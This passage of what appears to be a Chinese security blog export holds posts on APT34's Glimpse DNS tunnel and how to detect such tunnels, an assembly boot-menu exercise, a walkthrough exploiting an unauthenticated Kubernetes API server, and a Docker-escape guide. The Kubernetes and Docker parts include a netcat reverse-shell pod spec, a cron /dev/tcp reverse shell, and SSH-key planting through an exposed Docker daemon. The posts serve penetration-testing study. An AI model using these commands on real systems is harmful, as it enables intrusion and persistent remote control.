Name字段，就是shellcode。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image014.png)\n\n### APT34-Glimpse\n\nAPT34刚刚报出的远控工具，考虑到需要进行检测，就看了一下\n\n结构：\n\n工具是分为三个部分，server、Agent、panel\n\nServer是一个node.js编写的服务端，会建立一个dns服务器\n\npanel中的exe文件为可视化控制台\n\nAgent中主要看dns_main.ps1，其他两个powershell文件都是混淆过的。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image015.png)\n\n演示：\n\n文件中包含了Readme文件，照着安装就好。\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image016.png)\n\n安装好了node.js然后forever start srvr.js开启\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image017.png)\n\n然后打开panel中的exe控制端\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image018.png)\n\n被控端运行dns_main.ps1之后看到出现的被控端\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image019.png)\n\n双击进入Agent Control Panel面板\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image020.png)\n\n测试了whoami，powershell脚本会在目录C:\\Users\\Public\\Libraries\\39af49429e\\sendbox下创建一个proc10110文件\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image021.png)\n\n通过抓包可以看到TXT记录中使用S0000>后面加base64编码的whoami命令\n\nS0000>aXBjb25maWc=\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image022.png)\n\n \n\n从dns_main.ps1中看的话可以看到一个大致的流程，首先会创建C:\\Users\\Public\\Libraries目录，然后根据生成随机值创建文件夹\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image023.png)\n\n三个目录分别对应的是接收到的命令和命令执行的结果\n\n![img](由APT34工具Glimpse引申出的DNS隧道问题.assets/clip_image024.png)\n\n## DNS隧道的检测\n\n其实上面所说的三种工具特征都非常明显，比较容易检测，但是DNS隧道的应用又非常灵活，假如作者稍加修改，可能单纯从特征上来匹配的检测规则就被绕过，所以想检测DNS隧道还是需要结合域名长度次数之类的情况。\n\n一般情况可以总结的特征：\n\n```\n请求方为受控方\n可能存在超长无.的TXT回包\n没有A记录返回结果\nTXT回包内容中大概率没有类似于.com|.cn|.net等域名格式\n```\n\n暂时还没有出测试结果，所以这些检测的有效性还需要检验，而且这里说的几个是利用TXT记录的，如果只检测TXT记录等于上文说的NativePayload_DNS又跳过了，所以检测的类型也要保证多样。","categories":["RedTeam&域安全"]},{"title":"汇编语言第三版课程设计二","url":"/2020/12-18-汇编语言第三版课程设计二/","content":"\n首先看下题目要求：\n\n![image-20201018170139231](汇编语言第三版课程设计二.assets/image-20201018170139231.png)\n\n首先实现四个功能：\n\n## 1、Reset PC\n\n```assembly\nmov     ax,0ffffh\npush    ax\nmov     ax,0\npush    ax\nretf\t\n```\n\n代码解析：\n\n```\nretf指令用栈中的数据修改CS和IP的内容，也就是说将CS:IP指向0ffff:0的位置\n而0ffff:0位置处存放了一条跳转指令，CPU执行了这个跳转指令之后会转去执行BIOS中的硬件系统和初始化程序，这个内容在13.5章节说的比较清楚\n```\n\n![image-20201018181011535](汇编语言第三版课程设计二.assets/image-20201018181011535.png)\n\n## 2、引导现有的操作系统\n\n![image-20201018201237192](汇编语言第三版课程设计二.assets/image-20201018201237192.png)\n\n也就是说重复这个操作就可以了：读取内容到0:7c00，然后将CD:IP指向0::7c00\n\n```\n在17.4节中有交代\n硬盘从80h开始，80h硬盘C，81h硬盘D\nal是扇区数\nah 13h的功能号，3表示写扇区\nes:bx指向接收从扇区读入的内存区\n\nch 磁道号\ncl 扇区号\n\ndh 磁头号，面\ndl 驱动器号\n```\n\n代码实现：\n\n```assembly\nmov ax,0\nmov es,ax\nmov bx,7c00h ;设置es:bx指向接收从扇区读入/出数据的内存区\n;\nmov al,1 ;扇区\nmov ch,0 ;磁道号\nmov cl,1 ;扇区号\nmov dl,80h ;硬盘C驱动器号\nmov dh,0 ;磁头号\nmov ah,2 ;13h的功能号，2表示读扇区，3表示写扇区\nint 13h ;将指定扇区的内容读取到0:7c00h上\n\n;使用retf修改CS和IP的值\nmov bx,0\npush bx\nmov bx,7c00h\npush bx\nretf\n```\n\n## 3、进入时钟程序\n\n![image-20201018220217146](汇编语言第三版课程设计二.assets/image-20201018220217146.png)\n\n可以参考14.4节的读取CMOS信息的程序，这里读取的是月份，并显示在屏幕中间\n\n```assembly\nassume cs:code\ncode segment\nstart:\n\tmov al,8\n\tout 70h,al\n\tin al,71h\n\t\n\tmov ah,al\n\tmov cl,4\n\tshr ah,cl\n\tand al,00001111b\n\t\n\tadd ah,30h\n\tadd al,30h\n\t\n\tmov bx,0b800h\n\tmov es,bx\n\tmov byte ptr es:[160*12+40*2],ah\n\tmov byte ptr es:[160*12+40*2+2],al\n\t\n\tmov ax,4c00h\n\tint 21h\n\t\ncode ends\nend start\n```\n\n实验14显示完整的时间代码：\n\n```assembly\nassume cs:code\ncode segment\n\nstart:    mov ax, 0b800H     \n      mov es, ax\n      mov di, 160*12+30*2         ;设置es:di指向屏幕中间，位置可以调整          \n      mov al, 9                   ;入口参数，端口单元：9号（年份）                   \n      call read_show              ;调用子程序转换并显示\n      mov byte ptr es:[di+4], '/' ;写分隔符\n      mov al, 8                   ;端口单元：9号（月份）\n      call read_show\n      mov byte ptr es:[di+4], '/'\n      mov al, 7                   ;端口单元：7号（日）\n      call read_show\n      mov byte ptr es:[di+4], ' '\n      mov al, 4                   ;端口单元：4号（时）\n      call read_show\n      mov byte ptr es:[di+4], ':'\n      mov al, 2                   ;端口单元：2号（分）\n      call read_show\n      mov byte ptr es:[di+4], ':'\n      mov al, 0                   ;端口单元：0号（秒）\n      call read_show\n      mov ax, 4c00H\n      int 21H\n;---\n;子程序名称：read_show\n;功能：将CMOS RAM中存储的系统时间读取并转换成ASCII码，并显示出来\n;入口参数：al（端口单元号），di（显存缓冲区偏址）\n;返回值：无\n;--- \nread_show:\n      ;保护寄存器变量，di不用了。\n      push ax\n      push cx\n      add di, 6           ;递增3个字（6个字节）用于显示下一个数据。\n     \n      out 70H, al\n      in al, 71H\n      ;将al中BCD码数据分离为高4位（存储在ah）和低4位（存储在al）\n      mov ah, al          ;（al）是读出的BCD数据，复制给ah一份\n      mov cl, 4           ;设置移位的位数是4\n      shr ah, cl          ;将ah寄存器右移4位，前面4位补0，将高4位（十位）保留\n      and al, 00001111b   ;将al寄存器逻辑与，前4位置0，后4位（个位）保留\n      ;转换成ASCII码，用于显示\n      add ah, 30H\n      add al, 30H\n      ;显示\n      mov byte ptr es:[di], ah        ;显示十位\n      mov byte ptr es:[di+2], al      ;显示个位\n     \n      ;恢复寄存器\n      pop cx\n      pop ax\n      ret\ncode ends\nend start\n```\n\n## 4、设置时间\n\n这里设置时间实际就是往CMOS中的时间内存单元写数据，比如修改年的示例代码，理论上是这样，然而却修改不了？\n\n```assembly\nassume cs:code\ncode segment\nstart:\n\t;mov al,8\n\t;out 70h,al\t;像70h端口写入要访问的单元的地址\n\t;如果希望读取，则应该\n\t;in al,71h\t;从71h端口取得指定单元的数据\n\t\n\t;mov ah,al\n\t;mov cl,4\n\t;shr ah,cl\n\t;and al,00001111b\n\t\n\t;如果是写入，则应该写入比如1月，转换成BCD码就是0000 0001\n\t;然后将数据写入71h端口的8单元\n\tmov al,8\n\tout 70h,al\n\tmov al,00000001b\n\tout 71h\n\t\n\tmov ax,4c00h\n\tint 21h\n\t\ncode ends\nend start\n```\n\n## 5、组合\n\n这里是参照了https://my.oschina.net/hkmayfly/blog/3081209的代码，看了网上的几个版本还是觉得这个最精炼\n\n```assembly\nassume cs:code,ss:stack\nstack segment\n    db 128 dup (0)\nstack ends\ncode segment\nstart:\n    mov ax,stack\n    mov ss,ax\n    mov sp,128\n    \n    call copy_boot\n    \n    ;设置CS:IP为0:7e00h\n    mov ax,0\n    push ax\n    mov ax,7e00h\n    push ax\n    retf\n    \n    mov ax,4c00h\n    int 21h\n;org 7e00h\n;引导程序\nboot:\n    jmp boot_begin\n    func0    db 'Hk_Mayfly----XIUXIUXIU~',0\n    func1    db '1) reset pc',0\n    func2    db '2) start system',0\n    func3    db '3) clock',0\n    func4    db '4) set clock',0\n    ;相减得到的是标号的相对位置，+7e00h得到的绝对位置\n    func_pos    dw offset func0-offset boot+7e00h\n                dw offset func1-offset boot+7e00h\n                dw offset func2-offset boot+7e00h\n                dw offset func3-offset boot+7e00h\n                dw offset func4-offset boot+7e00h\n    time    db 'YY/MM/DD hh:mm:ss',0\n    cmos    db 9,8,7,4,2,0\n    clock1    db 'F1----change the color        ESC----return menu',0\n    clock2    db 'Please input Date and Time,(YY MM DD hh mm ss):',0\n    change    db 12 dup (0),0\n\nboot_begin:\n    call init_boot\n    call cls_screen\n    call show_menu \n    jmp choose\n    mov ax,4c00h\n    int 21h\n\nchoose:\n    call clear_kb_buffer\n    ;获取我们输入的操作，跳转到对于函数\n    mov ah,0\n    int 16h\n    cmp al,'1'\n    je choose_func1\n    cmp al,'2'\n    je choose_func2\n    cmp al,'3'\n    je choose_func3\n    cmp al,'4'\n    je choose_func4\n    \n    jmp choose\n\n;在题中提到了，开机后进入到ffff:0处执行指令\n;那我们也可以把重启理解为，跳转到ffff:0执行指令\n;所以我们利用jmp dword跳转到ffff:0地址，模拟重启\nchoose_func1:\n    mov bx,0ffffh\n    push bx\n    mov bx,0\n    push bx\n    retf\n    \n    jmp choose\n\n;题中对引导现有的操作系统的描述是调用int 19，这里为了方便就直接写成函数了\nchoose_func2:\n    mov bx,0\n    mov es,bx\n    mov bx,7c00h\n    \n    mov al,1;扇区数\n    mov ch,0\n    mov cl,1;扇区\n    mov dl,80h\n    mov dh,0\n    mov ah,2;读取\n    int 13h\n    \n    mov bx,0\n    push bx\n    mov bx,7c00h\n    push bx\n    retf\n    \n    jmp choose\n\n;获取时间\nchoose_func3:\n    call show_time\n    \n    jmp choose\n\nshow_time:\n    call init_boot\n    call cls_screen\n    ;显示按键信息\n    mov si,offset clock1-offset boot+7e00h\n    mov di,160*14+10*2;在14行10列显示\n    call show_line\nshow_time_start:\n    ;获取时间信息，并显示（将time中的未知字符替换为当前时间）\n    call get_time_info\n    mov di,160*10+30*2;屏幕显示的偏移地址\n    mov si,offset time-offset boot+7e00h;time标号的偏移地址\n    call show_line\n    \n    ;获取键盘缓存区的数据\n    mov ah,1\n    int 16h\n    ;没有数据就跳回show_time_start\n    jz show_time_start\n    ;判断是否按下F1\n    cmp ah,3bh\n    je change_color\n    ;判断是否按下ESC\n    cmp ah,1\n    je Return_Main\n    ;有数据，但是是无用的键盘中断，清除\n    cmp al,0\n    jne clear_kb_buffer2\n    ;返回开始，重复之前的操作，达到刷新时间的效果。\n    jmp show_time_start\n\nchange_color:\n    call change_color_show\nclear_kb_buffer2:\n    call clear_kb_buffer\n    jmp show_time_start\nReturn_Main:\n    ;返回到开始，重新打印菜单\n    jmp boot_begin\n    ret\n\nchoose_func4:\n    call set_time\n    jmp boot_begin\n    \nset_time:\n    call init_boot\n    call cls_screen\n    call clear_stack\n    \n    ;设置提示信息显示位置\n    mov di,160*10+13*2\n    mov si,offset clock2-offset boot+7e00h\n    call show_line\n    ;显示修改后change中的内容\n    mov di,160*12+26*2\n    mov si,offset change-offset boot+7e00h\n    call show_line\n    \n    call get_string\n\nget_string:\n    mov si,offset change - offset boot + 07e00H\n    mov bx,0\ngetstring:\n    ;获取键盘输入的时间信息\n    mov ah,0\n    int 16h\n    \n    ;输入的时间为数字0~9\n    cmp al,'0'\n    jb error_input\n    cmp al,'9'\n    ja error_input\n    ;将我们输入的时间字符入栈\n    call char_push\n    ;不能超过输入的数量\n    cmp bx,12\n    ja press_ENTER\n    mov di,160*12+26*2\n    call show_line\n    jmp getstring\nerror_input:\n    ;判断是不是按下退格或回车键\n    cmp ah,0eh\n    je press_BS\n    cmp ah,1ch\n    je press_ENTER\n\n    jmp getstring\n;按下回车\npress_BS:\n    call char_pop\n    mov di,160*12+26*2\n    call show_line\n    jmp getstring\n;按下enter就退出\npress_ENTER:\n    ret\n\nchar_push:\n    ;只能最多输入12个数字\n    cmp bx,12\n    ja char_push_end\n    ;将数值移动到对应位置\n    mov ds:[si+bx],al\n    inc bx;表示我们输入了多少个字符\nchar_push_end:\n    ret\n\nchar_pop:\n    ;判断是否输入了设置时间的数值，没有就相当于删完了\n    cmp bx,0\n    je char_pop_end\n    ;否则用星号替换，相当于删除\n    dec bx\n    mov byte ptr ds:[si+bx],'*'\nchar_pop_end:\n    ret\n\nclear_stack:\n    push bx\n    push cx\n    \n    mov bx,offset change-offset boot+7e00h\n    mov cx,12\ncls_stack:\n    ;替换change段中内容\n    mov byte ptr ds:[bx],'*'\n    inc bx\n    loop cls_stack\n    \n    pop cx\n    pop bx\n    ret\n    \n\n;获取时间\nget_time_info:\n    ;从cmos ram获取年月日，时分秒6个数据\n    mov cx,6\n    ;获取存放单元地址\n    mov bx,offset cmos - offset boot + 7e00H\n    ;通过替换来显示\n    mov si,offset time - offset boot + 7e00H\nnext_point:   \n    push cx\n    ;获取单元号\n    mov al,ds:[bx]\n    ;向70h端口写入要访问的单元地址，并从71h端口读取数据\n    out 70H,al\n    in al,71H\n    ;右移4位获取十位\n    mov ah,al\n    mov cl,4\n    shr al,cl\n    and ah,00001111b\n    ;将BCD码转换为ASCII码\n    add ax,3030H\n     ;写入time中\n    mov word ptr ds:[si],ax\n    ;下一单元号\n    inc bx\n    ;每个数据之间距离都是3\n    add si,3\n    pop cx\n    loop next_point\n    ret\n\n;改变颜色\nchange_color_show:\n    push bx\n    push cx\n \n    mov cx,2000\n    mov bx,1\nnext:\n    ;属性值+1，改变颜色\n    add byte ptr es:[bx],1\n    ;当超出字体颜色的数值(0~111h)时，将数值重置\n    cmp byte ptr es:[bx],00001000b\n    jne change_end\n    ;因为背景是黑色，所以文字颜色就不设置成黑色了\n    mov byte ptr es:[bx],1\nchange_end:\n    add bx,2\n    loop next\n \n    pop cx\n    pop bx\n    ret\n\nclear_kb_buffer:\n    ;1号程序，用来检测键盘缓冲区是否有数据\n    ;如果有的话ZF!=0，没有，ZF=0\n    mov ah,1\n    int 16h\n    ;通过ZF判断减缓缓冲区是否有数据，没有就跳出\n    jz clear_kb_bf_end\n    mov ah,0\n    int 16h\n    jmp clear_kb_buffer\nclear_kb_bf_end:\n    ret\n\ninit_boot:\n    ;基本设置，注意：程序的直接定址表默认段地址是CS\n    ;当程序转移到7c00h时，代码中CS值未发生改变，\n    ;所以需要我们指明段地址\n    mov bx,0b800h\n    mov es,bx\n    mov bx,0\n    mov ds,bx\n    ret\n    \n;清屏\ncls_screen:\n    mov bx,0\n    mov cx,2000\n    mov dl,' '\n    mov dh,2;字体为绿色，不设置的话，在我们显示菜单时，字体和背景颜色相同\ns:    mov es:[bx],dx\n    add bx,2\n    loop s\nsret:\n    ret\n\n;展示界面\nshow_menu:\n    ;在10行，30列显示菜单\n    mov di,160*10+30*2\n    ;保存在直接定址表的绝对位置\n    mov bx,offset func_pos-offset boot+7e00h\n    ;菜单有5行\n    mov cx,5\ns1:\n    ;这里相当于外循环，每次一行\n    ;获取func_pos中每行的保存位置的偏移地址\n    mov si,ds:[bx]\n    ;调用内循环函数，输出一行的每个字符\n    call show_line\n    ;下一行偏移地址\n    add bx,2\n    ;下一行显示\n    add di,160\n    loop s1\n    ret\n    \nshow_line:\n    push ax\n    push di\n    push si\nshow_line_start:\n    ;获取这一行的第si+1个字符\n    mov al,ds:[si]\n    ;判断是否到末尾\n    cmp al,0\n    je show_line_end\n    ;保存字符到显示缓冲区\n    mov es:[di],al\n    add di,2\n    inc si\n    jmp show_line_start\nshow_line_end:\n    pop si\n    pop di\n    pop ax\n    ret\n\nboot_end:nop\n\n;转存引导程序\ncopy_boot:\n    ;将引导程序储存到指定位置\n    mov ax,0\n    mov es,ax\n    mov di,7e00h\n    \n    mov ax,cs\n    mov ds,ax\n    mov si,offset boot\n    mov cx,offset boot_end-offset boot\n    cld\n    rep movsb\n    \n    ret\n\ncode ends\nend start\n```\n\n","categories":["计算机基础"]},{"title":"容器安全之K8S_APIServer未授权访问","url":"/2020/12-18-容器安全之K8S_APIServer未授权访问/","content":"\n# K8S简介\n\n## 概念\n\nK8S的全称是Kubernetes，是一种容器编排技术，简单的说就是用于容器的自动部署，扩展和管理的系统。比如在一个公司内部有一万个或者十万个docker，这么庞大的容器群不可能由人工来维护，所以容器编排技术应运而生。除了K8S之外还有Docker swarm、Mesos等，但是K8S是目前最火的了。\n\n## 架构\n\nK8S的架构可以参考下图，由Master和众多node节点组成，也就是说K8S是以集群的形式运行的，更多的细节和高清图可以参考[官方的链接](https://www.kubernetes.org.cn/kubernetes%E8%AE%BE%E8%AE%A1%E6%9E%B6%E6%9E%84)\n\n![image-20201123202342835](容器安全之K8S_APIServer未授权访问.assets/image-20201123202342835.png)\n\n## 常见的概念\n\n```\ncontainer：\n也就是容器，在每个node节点上都会安装有docker，K8S会通过docker来创建容器\n\nPods:\nPods是若干个容器的组合，比如一个应用同时存在web和数据库服务，并且web和数据库运行在不同的容器中，那么就可以把这两个容器划分到一个pods中\n\nkube-apiserver:\n是部署在Master上的一个API，API Server提供REST操作以及前端到集群的共享状态，所有其它组件可以通过这些共享状态交互。用户可以通过这个API新建容器/新建pods等等操作。\n常用端口：8080、6443\n\nkubectl:\nkubectl简单来说是一个可执行文件，也就是一个工具，可以通过它对API Server进行操作，简化命令。\n\nkubelet:\nkubelet 的主要功能就是定时从某个地方获取节点上 pod/container 的期望状态（运行什么容器、运行的副本数量、网络或者存储如何配置等等），并调用对应的容器平台接口达到这个状态。\n默认端口：10250，https、10255端口可以无需授权进行只读访问\n\netcd:\netcd用于保存集群所有的网络配置和对象的状态信息。\n默认端口：2379\n```\n\n## 环境搭建\n\n我这里使用的是这个文章的配置：https://www.cnblogs.com/zgqbky/p/12149753.html\n\n也可以参考这个项目中的方法快速搭建：https://github.com/easzlab/kubeasz\n\n# API Server未授权访问\n\n## 环境\n\n```\nmaster 192.168.254.167\nnode1 192.168.254.166\nnode2 192.168.254.168\n\n环境内的非K8S环境内主机\nali 192.168.254.170\n```\n\n## 常用命令\n\n### 启动服务\n\nmaster\n\n```\nsystemctl restart kube-apiserver kube-controller-manager kube-scheduler\n```\n\nnode\n\n```\nsystemctl restart kube-proxy kubelet docker\n```\n\n### 将pods添加到指定节点\n\n1.先给指定节点添加标签\n\n```bash\n./kubectl -s http://192.168.254.167:8080 label nodes node1 disktype=node1mark\n```\n\n2.查看是否有标签\n\n```bash\n./kubectl -s http://192.168.254.167:8080 get nodes --show-labels\n```\n\n3.创建一个调度到你选择的节点的 pod\n\n```bash\n./kubectl -s http://192.168.254.167:8080 create -f test.yaml\n```\n\n编写yaml文件：\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: nginx\n  labels:\n    env: test\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n    imagePullPolicy: IfNotPresent\n  nodeSelector:\n    disktype: node1mark #这个就是标签\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp6\nspec:\n  containers:\n  - image: php\n    name: php\n    volumeMounts:\n    - mountPath: /mnt\n      name: test-volume\n  volumes:\n  - name: test-volume\n    hostPath:\n      path: /\n  nodeSelector:\n    disktype: node1mark\n\n```\n\n4.查看结果\n\n可以看到创建在了node1上\n\n![image-20201113170936874](容器安全之K8S_APIServer未授权访问.assets/image-20201113170936874.png)\n\n## 利用\n\n### 获取基本信息\n\n使用的工具为kubectl，这里要注意使用的kubectl必须和服务端的版本一致，否则会报错。另外api-server最后实际上是把需要处理的事情发给了kubelet，这里首先尝试在Kali上执行下面命令获取一些基本信息：\n\n```bash\nkubectl -s http://192.168.254.167:8080 get pods\n#还可以加-o wide查看pods所在的节点：\nkubectl -s http://192.168.254.167:8080 get po -o wide\n```\n\n![image-20201113163445125](容器安全之K8S_APIServer未授权访问.assets/image-20201113163445125.png)\n\n```bash\n#查看所有节点：\nkubectl -s http://192.168.254.167:8080 get nodes\n```\n\n![image-20201113163345680](容器安全之K8S_APIServer未授权访问.assets/image-20201113163345680.png)\n\n### 创建PODS\n\n首先在攻击者本地生成一个yaml的文件用于创建pods：`vi test.yaml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: myapp7\nspec:\n  containers:\n  - image: nginx\n    name: nginx\n    volumeMounts:\n    - mountPath: /mnt\n      name: test-volume\n  volumes:\n  - name: test-volume\n    hostPath:\n      path: /\n  nodeSelector:\n    disktype: node1mark  # 通过标记指定pod创建在哪个节点上\n```\n\n通过kubectl工具向master发送创建请求：\n\n```bash\n./kubectl -s http://192.168.254.167:8080 create -f test.yaml\n```\n\n![image-20201113175509340](容器安全之K8S_APIServer未授权访问.assets/image-20201113175509340.png)\n\n### 连接PODS\n\n连接目标pods，注意这里连接时传入的参数名称虽然是pods的名称，但是命令实际上是在容器中执行的\n\n```bash\n./kubectl -s http://192.168.254.167:8080 --namespace=default exec -it myapp7 bash\n```\n\n![image-20201113175532677](容器安全之K8S_APIServer未授权访问.assets/image-20201113175532677.png)\n\n这里我们使用命令`echo 1 > myapp7.txt`输出一个标记文件，然后在node1中查找对应的容器可以看到\n\n![image-20201113181016411](容器安全之K8S_APIServer未授权访问.assets/image-20201113181016411.png)\n\n在node1上直接连接myapp7的容器可以看到`myapp7.txt`文件\n\n![image-20201113180947540](容器安全之K8S_APIServer未授权访问.assets/image-20201113180947540.png)\n\n局限性是这里只能拿到容器的权限，或者说只能创建一个容器，但是并不能拿到宿主机的权限\n\nhttps://www.freebuf.com/vuls/196993.html这个文章里说到了创建容器时反弹shell的方法：\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test\nspec:\n  containers:\n  - name: busybox\n    image: busybox:1.29.2\n    command: [\"/bin/sh\"]\n    args: [\"-c\", \"nc ip 4444 -e /bin/sh\"]\n    volumeMounts:\n    - name: host\n      mountPath: /host\n  volumes:\n  - name: host\n    hostPath:\n      path: /\n      type: Directory\n```\n\n可以通过这个方法直接拿到容器的shell","categories":["大数据/云/容器"]},{"title":"容器安全之docker逃逸","url":"/2020/12-18-容器安全之docker逃逸/","content":"\n最近在做docker和K8S的安全测试，并且近期希望多些点博客，所以在此记录一下，另外这里文中提到的都是几种配置层面的docker的安全问题。\n\n# 0x00 Hypervisor\n\nHypervisor，又称虚拟机监视器（英语：virtual machine monitor，缩写为 VMM），是用来建立与执行虚拟机器的软件、固件或硬件。\n\nHypervisor用来执行一个或多个虚拟机器的电脑称为主体机器（host machine），这些虚拟机器则称为客体机器（guest machine）。hypervisor提供虚拟的作业平台来执行客体操作系统（guest operating systems），负责管理其他客体操作系统的执行阶段；这些客体操作系统，共同分享虚拟化后的硬件资源。\n\n```\nHypervisor——一种运行在基础物理服务器和操作系统之间的中间软件层，可允许多个操作系统和应用共享硬件。也可叫做VMM（ virtual machine monitor ），即虚拟机监视器。\nHypervisors是一种在虚拟环境中的“元”操作系统。他们可以访问服务器上包括磁盘和内存在内的所有物理设备。Hypervisors不但协调着这些硬件资源的访问，也同时在各个虚拟机之间施加防护。当服务器启动并执行Hypervisor时，它会加载所有虚拟机客户端的操作系统同时会分配给每一台虚拟机适量的内存，CPU，网络和磁盘。\n```\n\n## 常见的Hypervisor架构\n\n三种最常见的Hypervisor架构\n\n```\nI型：虚拟机直接运行在系统硬件上，创建硬件全仿真实例，被称为\"裸机\"。\nII型：虚拟机运行在传统操作系统上，同样创建的是硬件全仿真实例，被称为\"托管\"hypervisor。\n容器：虚拟机运行在传统操作系统上，创建一个独立的虚拟化实例，指向底层托管操作系统，被称为\"操作系统虚拟化\"。\n```\n\n引用网上的两个图：\n\n![image-20201105101116146](容器安全之docker逃逸.assets/image-20201105101116146.png)\n\n![image-20201105101222345](容器安全之docker逃逸.assets/image-20201105101222345.png)\n\n可以看到Type-I型的VVM是直接运行在硬件上的，也就是Ring0层，例子：VMware ESX Server、Citrix XenServer 和 Microsoft Hyper-V，Linux KVM。\n\nType-II型的在VMM和硬件之间还有一层宿主操作系统。由于 Guest OS 对硬件的访问必须 经过宿主操作系统，因而带来了额外的性能开销，但可充分利用宿主操作系统 提供的设备驱动和底层服务来进行内存管理、进程调度和资源管理等。主机虚 拟化中 VM 的应用程序调用硬件资源时需要经过:VM 内核->Hypervisor->主机内核 ，导致性能是三种虚拟化技术中最差的 。\n例子：VMware Server（GSX）、Workstation 和 Microsoft Virtual PC 、 Virtual Server 等。\n\n## docker\n\n第三种是容器，docker也就是容器的一种。前面两种都可以成为是虚拟机，与虚拟机相比，容器资源的损耗小的多，同样的宿主机下，能够建立容器的数量要比虚拟机多得多。但是容器的安全性不如虚拟机，因为虚拟机需要突破hypervisor。docker容器与宿主机共享内核，文件系统等资源，更有可能对其他容器，宿主机产生影响。\n\n# 0x01 容器安全面临的主要风险\n\n```\n1、虚拟化安全风险\n直白的说就是容器的隔离和逃逸问题\n\n2、镜像安全风险\n比如下载了恶意的镜像，或者镜像源被污染\n\n3、网络安全风险\n也就是网络层面的攻击，比如在2019年的KCON上还有关于针对Docker容器网络的ARP欺骗攻击的议题\n```\n\n# 0x03 常见的逃逸手法\n\n## Docker daemon未授权访问\n\n直接在shadon上搜到了一个：https://www.shodan.io/host/XXXXXX\n\n![image-20201106151758047](容器安全之docker逃逸.assets/image-20201106151758047.png)\n\n查看镜像：\n\n```shell\ndocker -H tcp://xx.xx.xx.xx:2375 images\n```\n\n![image-20201106151903900](容器安全之docker逃逸.assets/image-20201106151903900.png)\n\n### 写入公钥\n\n首先启动一个容器，并且将宿主机的关键目录挂载到docker中：\n\n```bash\ndocker -H tcp://xx.xx.xx.xx run -it -v /root:/tmp/root -v /etc/ssh:/tmp/ssh_etc -v /var/log:/tmp/log e83c2c53328c /bin/bash\n```\n\n![image-20201112150816445](容器安全之docker逃逸.assets/image-20201112150816445.png)\n\n查看是否允许root登录，Yes为允许：\n\n```\ncat /tmp/ssh_etc/sshd_config |grep PermitRootLogin\n```\n\n![image-20201112151210656](容器安全之docker逃逸.assets/image-20201112151210656.png)\n\n然后在自己的攻击者电脑上生成密钥对：\n\n```\nssh-keygen -t rsa -C \"hello@world.com\"\n```\n\n![image-20201112151628786](容器安全之docker逃逸.assets/image-20201112151628786.png)\n\n将公钥写入到宿主机的`/root/.ssh/authorized_keys`文件中\n\n```\ncat >> /tmp/root/.ssh/authorized_keys <<EOF\n```\n\n![image-20201112151749738](容器安全之docker逃逸.assets/image-20201112151749738.png)\n\n在`>`符号之后输入公钥，然后再输入`EOF`即可，然后就可以使用私钥ssh登录目标宿主机：\n\n```\nssh -i ./id_rsa root@xx.xx.xx.xx -p 1022\n```\n\n修复方案\n\n```\n1.对2375端口做网络访问控制，如ACL控制，或者访问规则\n\n2.修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行。\n```\n\n## 挂载目录方式逃逸\n\n在linux下，/mnt/目录的作用为：\n\n```\n挂接光驱、USB设备的目录，加载后，会在mnt里多出相应设备的目录。mnt是mount的缩写。\n```\n\n关于/mnt/的几个点：\n\n```\n1、挂载点必须是一个目录。\n\n2、一个分区挂载在一个已存在的目录上，这个目录可以不为空，但挂载后这个目录下以前的内容将不可用。对于其他操作系统建立的文件系统的挂载也是这样。\n\n3、光盘、软盘、其他操作系统使用的文件系统的格式与linux使用的文件系统格式是不一样的。光盘是ISO9660；软盘是fat16或ext2；windows NT是fat16、NTFS；windows98是fat16、fat32；windows2000和windowsXP是fat16、fat32、 NTFS。挂载前要了解linux是否支持所要挂载的文件系统格式。\n```\n\n**docker的危险挂载方式：**\n\n例：\n\n```\ndocker run --name wnginx -d -v /root:/mnt/root\n\ndocker run -it -v /root:/mnt/root e83c2c53328c /bin/bash\n```\n\n![image-20201106164818877](容器安全之docker逃逸.assets/image-20201106164818877.png)\n\n这里是挂载了宿主机的/root/目录，就可以直接写入ssh秘钥了，还有其他的方式比如挂载了/var/目录\n\n```\n1、在~/.ssh目录中留SSH公钥 \ncat id_rsa.pub >> /mnt/root/.ssh/authorized_keys\n2、Crontab 中留定时任务, 定时反弹shell至指定服务器\necho '* * * * * /bin/bash -i >& /dev/tcp/xx.xx.xx.xx/8888 0>&1' >> /mnt/var/spool/cron/crontabs/root\n```\n\n## 特权模式运行利用\n\ndocker特权模式下运行的容器可以在容器内执行mount等命令，从而能够将宿主机的目录挂载到容器内。\n\n首先使用特权模式启用容器：\n\n```\ndocker run -it --privileged e83c2c53328c /bin/bash\n```\n\n![image-20201106173134735](容器安全之docker逃逸.assets/image-20201106173134735.png)\n\n然后使用mount命令将宿主机的目录挂载到容器内的abc目录下：\n\n```\nmount /dev/vda1 /abc\n```\n\n![image-20201106174202014](容器安全之docker逃逸.assets/image-20201106174202014.png)\n\n挂载成功之后`ls /abc`可以看到已经有内容了，不过这里宿主机的`/dev/vda1`是`/boot/`目录，如果是`/root/`目录就可以进行其他方式的利用\n\n## docker.sock\n\nhttps://www.freebuf.com/articles/container/242763.html\n\nDocker采用C/S架构，我们平常使用的Docker命令中，docker即为client，Server端的角色由docker daemon扮演，二者之间通信方式有以下3种：\n\n```\n1、unix:///var/run/docker.sock\n2、tcp://host:port\n3、fd://socketfd\n```\n\n当容器进程需要与docker daemon守护进程进行通信的时候，容器本身需要挂载`/var/run/docker.sock`文件，这里首先在Kali中创建起一个ubuntu，并且挂载了`/var/run/`目录\n\n```shell\ndocker run -it -v /var/run/:/host/var/run/ ubuntu 